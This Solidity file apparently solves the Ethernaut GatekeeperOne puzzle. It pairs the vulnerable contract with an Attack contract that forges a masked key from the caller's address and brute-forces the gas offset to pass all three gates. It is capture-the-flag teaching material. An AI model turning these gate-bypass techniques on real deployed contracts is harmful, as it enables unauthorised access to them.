// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "hardhat/console.sol";

contract GatekeeperOne {
    address public entrant;
    event Attempt(string msg);

    modifier gateOne() {
        require(msg.sender != tx.origin, "gate one");
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0, "gate two");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    GatekeeperOne gate;
    event Attempt(uint256 gasUsed);
    event Key(bytes8 key);


     constructor(address target) {
        gate = GatekeeperOne(target);
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;

        for (uint i = 0; i < 8191; i++) {
            (bool result,) =  address(gate).call{gas: 8191 * 3 + i}(abi.encodeWithSignature("enter(bytes8)", key));

            if (result) {
                break;
            }
        }
    }
}
